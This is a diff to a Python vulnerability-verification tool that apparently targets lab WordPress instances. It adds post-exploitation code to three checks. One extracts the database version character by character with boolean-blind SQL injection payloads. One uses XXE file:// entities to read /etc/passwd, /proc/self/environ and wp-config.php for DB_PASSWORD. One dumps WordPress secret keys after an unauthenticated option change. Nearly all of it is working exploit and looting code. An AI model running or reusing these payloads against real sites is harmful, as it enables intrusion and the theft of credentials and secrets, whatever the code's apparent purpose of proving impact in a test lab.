@@ -8512,9 +8512,67 @@ def verify_wordpress_sqli(
                 base_url=boot.base_url, endpoint=endpoint, method=m,
                 params=_poc_params, json_body=json_body, technique="boolean-blind SQLi",
                 description=f"Boolean-blind SQLi on '{sqli_param}': TRUE condition returns different response size than FALSE. Replace TARGET with the real host.")
+            # --- Post-confirmation: extract DB version char-by-char to prove data access ---
+            _extracted_version = ""
+            try:
+                _base_true = _bool_winning  # winning TRUE payload
+                # Build a base TRUE payload for substring extraction.
+                # We detect which quote style worked from the payload.
+                _q = "'" if ("'" in _bool_winning) else ""
+                _version_chars: list[str] = []
+                _bool_budget_left = max(0, budget_s - (time.time() - t0) - 30)
+                if _bool_budget_left > 60:
+                    # Extract up to 20 chars of version() char-by-char
+                    _prev_true_len = res.evidence.get("respuesta_true_len", 0)
+                    _prev_false_len = res.evidence.get("respuesta_false_len", 0)
+                    _len_diff_sign = "true_bigger" if _prev_true_len > _prev_false_len else "false_bigger"
+                    for _pos in range(1, 21):
+                        if time.time() - t0 >= budget_s - 30:
+                            break
+                        _found_char = None
+                        for _ascii_code in range(46, 123):  # . / 0-9 a-z
+                            # payload: 1 AND ASCII(SUBSTRING(version(),N,1))=M
+                            _char_true = (
+                                f"{orig_value}{_q} AND ASCII(SUBSTRING(version(),{_pos},1))={_ascii_code}-- -"
+                            )
+                            _char_false = (
+                                f"{orig_value}{_q} AND ASCII(SUBSTRING(version(),{_pos},1))={_ascii_code + 1}-- -"
+                            )
+                            try:
+                                _rt_chr = send(_char_true)
+                                _rf_chr = send(_char_false)
+                                _lt_chr = len(_rt_chr.text or "")
+                                _lf_chr = len(_rf_chr.text or "")
+                                # TRUE payload matches → length should resemble base TRUE
+                                _base_true_response = send(_bool_winning)
+                                _base_true_len = len((_base_true_response.text or ""))
+                                _matches_true = abs(_lt_chr - _base_true_len) < 100
+                                _matches_false = abs(_lf_chr - _base_true_len) < 100
+                                if _matches_true and not _matches_false:
+                                    _found_char = chr(_ascii_code)
+                                    break
+                            except Exception:
+                                break
+                        if _found_char is None:
+                            break
+                        _version_chars.append(_found_char)
+                        # Stop early at null byte or control characters
+                        if ord(_found_char) < 32:
+                            break
+                    if _version_chars:
+                        _extracted_version = "".join(_version_chars)
+                        res.evidence["extracted_data"] = _extracted_version
+                        res.evidence["extracted_query"] = "version()"
+                        res.detail += (f" | Dato extraido: version()='{_extracted_version}' "
+                                       f"({len(_version_chars)} chars via boolean-blind char-by-char)")
+                        step(f"[bool-extract] version()='{_extracted_version}' extraido char-by-char")
+            except Exception as _be_err:
+                step(f"[bool-extract] extraccion fallida: {_be_err}")
+
             # Screenshot terminal con diferencial TRUE/FALSE
             _true_len = res.evidence.get("respuesta_true_len", 0)
             _false_len = res.evidence.get("respuesta_false_len", 0)
+            _extract_line = f"\nExtracted data: version()='{_extracted_version}'" if _extracted_version else ""
             _capture_terminal_shot(
                 boot, "binoracle · Boolean-blind SQLi — TRUE/FALSE differential",
                 content=(f"[BOOLEAN-BLIND SQLi CONFIRMED]\n"
@@ -8522,15 +8580,18 @@ def verify_wordpress_sqli(
                          f"TRUE payload:  {_bool_winning!r}\n"
                          f"TRUE response:  {_true_len} bytes (matches control baseline)\n"
                          f"FALSE response: {_false_len} bytes (consistently different)\n"
-                         f"Pairs confirmed: {consistent_diffs}/{len(pairs)}\n\n"
+                         f"Pairs confirmed: {consistent_diffs}/{len(pairs)}"
+                         f"{_extract_line}\n\n"
                          f"The server produces different response sizes for TRUE vs FALSE\n"
                          f"SQL conditions, confirming the parameter is interpreted as SQL."),
                 highlight="CONFIRMED",
                 caption_es=(f"Paso 5 (CLAVE): SQLi BOOLEAN-BLIND CONFIRMADA — diferencial "
                             f"TRUE ({_true_len}B) vs FALSE ({_false_len}B) consistente en "
-                            f"{consistent_diffs}/{len(pairs)} pares. Param: {sqli_param}"),
+                            f"{consistent_diffs}/{len(pairs)} pares. Param: {sqli_param}"
+                            + (f" | version()='{_extracted_version}'" if _extracted_version else "")),
                 caption_en=(f"Step 5 (KEY): BOOLEAN-BLIND SQLi CONFIRMED — TRUE ({_true_len}B) "
-                            f"vs FALSE ({_false_len}B) differential in {consistent_diffs}/{len(pairs)} pairs."),
+                            f"vs FALSE ({_false_len}B) differential in {consistent_diffs}/{len(pairs)} pairs."
+                            + (f" Extracted: version()='{_extracted_version}'" if _extracted_version else "")),
                 url=boot.base_url + endpoint)
             res.evidence["screenshots"] = boot.shots
             res.evidence["http_captures"] = boot.http_captures
@@ -11140,6 +11201,48 @@ def verify_wordpress_xxe(
                               f"contiene el secreto exacto plantado en {canary_path} -- el "
                               f"parser XML resolvio una entidad externa apuntando al sistema de "
                               f"ficheros real")
+
+                # --- Post-XXE escalation: read /etc/passwd to prove arbitrary file read impact ---
+                _xxe_loot: dict = {}
+                _winning_mode_label = res.evidence.get("modo_ganador", "")
+                _xxe_loot_targets = [
+                    ("/etc/passwd", r"root:x:0:0", "etc_passwd"),
+                    ("/etc/hostname", r".", "hostname"),
+                    ("/proc/self/environ", r"PATH=", "proc_environ"),
+                    ("/var/www/html/wp-config.php", r"DB_PASSWORD", "wp_config"),
+                ]
+                for _loot_path, _loot_pattern, _loot_key in _xxe_loot_targets:
+                    if time.time() - t0 >= budget_s - 30:
+                        break
+                    try:
+                        _loot_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
+                                     f'"file://{_loot_path}">]><foo>&xxe;</foo>')
+                        _loot_resp = None
+                        if xml_param:
+                            _loot_payload = dict(base_params)
+                            _loot_payload[xml_param] = _loot_xml
+                            _loot_resp = boot.sub_sess.request(
+                                m, boot.base_url + endpoint, timeout=20,
+                                data=_loot_payload if m != "GET" else None,
+                                params=_loot_payload if m == "GET" else None)
+                        else:
+                            _loot_resp = boot.sub_sess.request(
+                                m, boot.base_url + endpoint, timeout=20,
+                                data=_loot_xml.encode(),
+                                headers={"Content-Type": "application/xml"})
+                        if _loot_resp and re.search(_loot_pattern, _loot_resp.text or ""):
+                            _xxe_loot[_loot_key] = {
+                                "path": _loot_path,
+                                "content_snippet": (_loot_resp.text or "")[:300],
+                            }
+                            step(f"[xxe-loot] {_loot_path} leido via XXE")
+                            if _loot_key == "etc_passwd":
+                                res.detail += " | /etc/passwd leido via XXE (prueba de lectura arbitraria de ficheros)"
+                    except Exception:
+                        continue
+                if _xxe_loot:
+                    res.evidence["xxe_post_loot"] = _xxe_loot
+
                 # Screenshot HTTP con el secreto en la respuesta
                 _xxe_body = res.evidence.get("respuesta_cuerpo_recorte", "")
                 if _xxe_body:
@@ -12309,6 +12412,27 @@ def verify_wordpress_missing_auth_probe(
                     res.detail = (f"sonda no-auth: opcion WP '{post_verify_wp_option}' cambiada "
                                   f"a '{_opt_actual}' sin autenticacion — escalada de privilegios "
                                   f"confirmada (prueba dura via wp-cli post-ataque)")
+                    # --- Post-escalation: dump sensitive wp_options to prove impact depth ---
+                    try:
+                        _sensitive_opts = [
+                            "siteurl", "admin_email", "auth_key", "secure_auth_key",
+                            "logged_in_key", "default_role", "users_can_register",
+                        ]
+                        _dumped_opts: dict = {}
+                        for _sopt in _sensitive_opts:
+                            if time.time() - t0 >= budget_s - 30:
+                                break
+                            _r_sopt = lab.wp_cli("option", "get", _sopt, timeout=15)
+                            _sopt_val = (_r_sopt.stdout or "").strip() if _r_sopt else ""
+                            if _sopt_val:
+                                _dumped_opts[_sopt] = _sopt_val[:120]
+                        if _dumped_opts:
+                            res.evidence["priv_esc_wp_options"] = _dumped_opts
+                            step(f"[priv-esc-loot] wp_options sensibles: {list(_dumped_opts.keys())}")
+                            res.detail += (f" | Opciones sensibles extraidas: "
+                                           f"{', '.join(list(_dumped_opts.keys())[:4])}")
+                    except Exception:
+                        pass
                 else:
                     res.detail = (f"sonda no-auth: endpoint respondio HTTP {status} sin auth, "
                                   f"pero opcion '{post_verify_wp_option}'='{_opt_actual}' "
